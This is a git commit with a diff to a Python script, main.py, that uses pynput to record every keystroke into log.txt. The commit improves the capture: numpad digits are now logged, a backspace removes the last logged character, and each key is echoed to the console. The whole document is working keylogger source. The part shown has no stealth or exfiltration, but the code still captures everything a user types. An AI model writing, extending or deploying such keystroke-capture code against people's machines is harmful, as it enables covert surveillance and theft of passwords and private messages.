96b590be92cd0a4f9a1c9b22c663d15481dee941
Jangid Amitkumar <134952776+amitkumar0128@users.noreply.github.com>
2024-12-11 23:12:15 +0530

    Log numbers and backspace
    Can log numbers and make changes in the log file when backspace key is pressed. Also, can write the names of the remaining keys without raising any error.

--- main.py
+++ main.py
@@ -2,15 +2,33 @@ from pynput.keyboard import Listener
 
 # Function to write to log file
 def write_to_log(key):
-    # Check for the keys
-    if str(key) == "Key.space":
-        data = " "
-    elif str(key) == "Key.enter":
-        data = "\n"
-    else:
-        data = str(key).replace("'", "")
 
-    # Append the text to log file
+    # Check for the keys
+    try:
+        if 96 <= key.vk <= 105:
+            data = chr(key.vk - 48)
+        else:
+            data = str(key).replace("'", "")
+
+    except AttributeError:
+        if str(key) == "Key.space":
+            data = " "
+        elif str(key) == "Key.enter":
+            data = "\n"
+        elif str(key) == "Key.backspace":
+            with open('log.txt', 'r+') as file:
+                content = file.read()
+                if content:
+                    file.seek(0)
+                    file.write(content[:-1])
+                    file.truncate()
+            return
+        else:
+            data = str(key).replace("'", "")
+
+    print(data)
+    
+    #Append the text to log file
     with open("log.txt", 'a') as log:
         log.write(data)
 
